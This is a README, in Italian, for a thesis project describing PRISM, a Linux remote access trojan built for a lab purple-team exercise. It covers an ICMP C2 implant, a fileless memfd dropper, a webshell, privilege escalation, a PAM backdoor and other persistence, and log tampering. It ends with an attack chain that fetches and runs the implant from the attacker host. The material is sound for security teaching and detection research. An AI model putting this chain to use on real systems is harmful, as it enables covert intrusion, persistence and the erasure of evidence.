# PRISM — Linux RAT for Purple Team Exercise

**Tesi di Laurea Magistrale — Università degli Studi di Salerno**  
Corso: Penetration Testing ed Ethical Hacking  
Titolo: Sviluppo e Analisi di un RAT per Ambienti Linux Enterprise nel contesto di un Purple Team Exercise  
Relatori: Prof. Vincenzo Carletti, Prof. Pasquale Foggia, Prof. Fortunato Lodari

---

## ⚠️ Disclaimer

Questo software è sviluppato esclusivamente a scopo didattico nell'ambito di un progetto di tesi universitaria.  
L'utilizzo al di fuori dell'ambiente GNS3 controllato del laboratorio è vietato.  
Il repository è privato e ad accesso riservato.

---

## Struttura del progetto

```
rat/
├── src/
│   ├── c2/
│   │   ├── prism.c               # Implant ICMP reverse beacon (target)
│   │   ├── prism_client.c        # C2 listener (Kali)
│   │   ├── chacha20.h            # Cifratura ChaCha20 (RFC 7539)
│   │   ├── dns_client.c          # Implant DNS tunneling (canale alternativo)
│   │   ├── dns_server.py         # C2 server DNS
│   │   ├── shell.php             # Webshell per initial access
│   │   └── deploy_gen.sh         # Script deploy PRISM via webshell
│   ├── memfd_loader.c            # Stage 1: fileless dropper via memfd_create
│   ├── privesc/
│   │   └── privesc.c             # Privilege escalation enumerator (5 vettori)
│   ├── persistence/
│   │   ├── persistence.c         # Persistenza 4-layer
│   │   ├── ldpreload_prism.c     # LD_PRELOAD hijacking
│   │   └── pam_backdoor.c        # PAM backdoor
│   ├── evasion/
│   │   ├── log_tamper.c          # Log tampering via syscall dirette
│   │   └── process_spoof.c       # Process name spoofing
│   └── discovery/
│       └── discovery.c           # Network/host enumeration
```

---

## Moduli implementati

### 1. Implant PRISM (`prism.c`)

- **C2**: ICMP reverse beacon — implant inizia la comunicazione verso Kali
- **Cifratura**: ChaCha20 (RFC 7539) con nonce casuale per ogni pacchetto
- **Evasion stack**:
  - Process name spoofing → appare come `[kworker/0:0]`
  - `setuid(0)` per escalation permanente a root
  - Syscall dirette x86-64 (bypass auditd/glibc hooking)
  - Log tampering con syscall dirette (rimuove IP C2 da syslog/auth.log)
  - Jitter randomizzato (beacon ogni 3–7s)
  - Lockfile: `/tmp/.prism.lock` — previene istanze duplicate
- **MITRE ATT&CK**: T1095, T1036.005, T1562.006

### 2. Stage 1 Fileless Dropper (`memfd_loader.c`)

- Legge il binario PRISM da stdin
- Crea un file descriptor anonimo in RAM tramite `memfd_create()` (syscall diretta)
- Esegue il binario con `fexecve()` — **nessun file scritto su disco**
- Process name spoofato a `[kworker/1:0]`
- In `/proc/PID/exe` appare come `/memfd: (deleted)`
- Resistente a scanner filesystem e antivirus basati su firme su disco
- **MITRE ATT&CK**: T1620 (Reflective Code Loading)

### 3. Privilege Escalation (`privesc/privesc.c`)

Enumera 5 vettori di escalation in ordine di priorità:

| Vettore | Tecnica | Note |
|---|---|---|
| Sudo misconfiguration | `sudo -n -l` | Cerca NOPASSWD su binari GTFOBins |
| SUID binary abuse | Scansione `/usr/bin`, `/bin` | Tabella exploit GTFOBins integrata |
| Linux capabilities | `getcap -r /` | Filtra `cap_setuid`, `cap_sys_admin`, ecc. |
| Kernel CVE | `uname -r` | Mappa versione su CVE noti (DirtyPipe, DirtyCow) |
| Credenziali in config | Grep su `/var/www`, `/etc` | Cerca password in chiaro in PHP/env/conf |

Se rileva `sudo NOPASSWD ALL`, tenta escalation automatica e installa il RAT come root.  
**MITRE ATT&CK**: T1548.003, T1068, T1552.001

### 4. DNS Tunneling (`dns_client.c`)

- Encoding base32 con alfabeto custom
- Beaconing con jitter 30s ± 10s
- Process name spoofing `[kworker/0:0]`
- **MITRE ATT&CK**: T1071.004

### 5. Persistenza 4-layer (`persistence/`)

| Layer | Tecnica | Path |
|---|---|---|
| 1 | Cron job | `/etc/cron.d/` (mimicry nome sistema) |
| 2 | Systemd service | `Restart=always` |
| 3 | SSH authorized_keys | Utenti privilegiati |
| 4 | PAM backdoor | `pam_backdoor.so` in `/etc/pam.d/` |

**MITRE ATT&CK**: T1053.003, T1543.002, T1098.004

### 6. Evasion (`evasion/`)

- **log_tamper**: Rimuove righe contenenti l'IP del C2 da `/var/log/syslog` e `/var/log/auth.log` via syscall dirette (bypassa auditd)
- **process_spoof**: Sovrascrive `argv[0]` e `/proc/self/comm` per mascherare il processo
- **MITRE ATT&CK**: T1562.006, T1036.005

### 7. Discovery (`discovery/`)

- Enumerazione host attivi sulla subnet
- Scansione porte aperte
- Identificazione servizi
- **MITRE ATT&CK**: T1046, T1018

### 8. Initial Access

- Webshell PHP (`shell.php`) su portale web vulnerabile
- Deploy PRISM via `memfd_loader` (fileless, senza wget dal target)
- Binario inviato inbound via HTTP POST da Kali → webshell → `memfd_loader` → PRISM in RAM
- **MITRE ATT&CK**: T1190, T1505.003

---

## Topologia GNS3

| Host | IP | Ruolo |
|---|---|---|
| Kali | 192.168.122.x | Attacker / C2 |
| WebServer | 10.0.2.10 | Target primario (DMZ) |
| JumpServer | 10.0.60.10 | Target lateral movement |
| Wazuh | 10.0.99.14 | SIEM (blue team) |
| DC | 10.0.70.100 | Obiettivo finale |
| OPNsense | gateway | Firewall |

---

## Attack Chain

```
Kali (attacker)
    │
    │  1. HTTP POST webshell upload
    ▼
WebServer (DMZ)
    │  shell.php eseguita da Apache (www-data)
    │
    │  2. wget memfd_loader + prism_static da Kali
    │  3. cat prism_static | memfd_loader <C2_IP>
    │     → PRISM caricato in RAM (nessun file su disco)
    │
    │  4. ICMP beacon verso Kali (ChaCha20 encrypted)
    ▼
Kali C2 (prism_client)
    │  shell interattiva come www-data
    │
    │  5. deploy privesc → enumera vettori
    │  6. sudo NOPASSWD python3 → root
    │  7. persistenza privilegiata installata
    ▼
WebServer compromesso come root
```
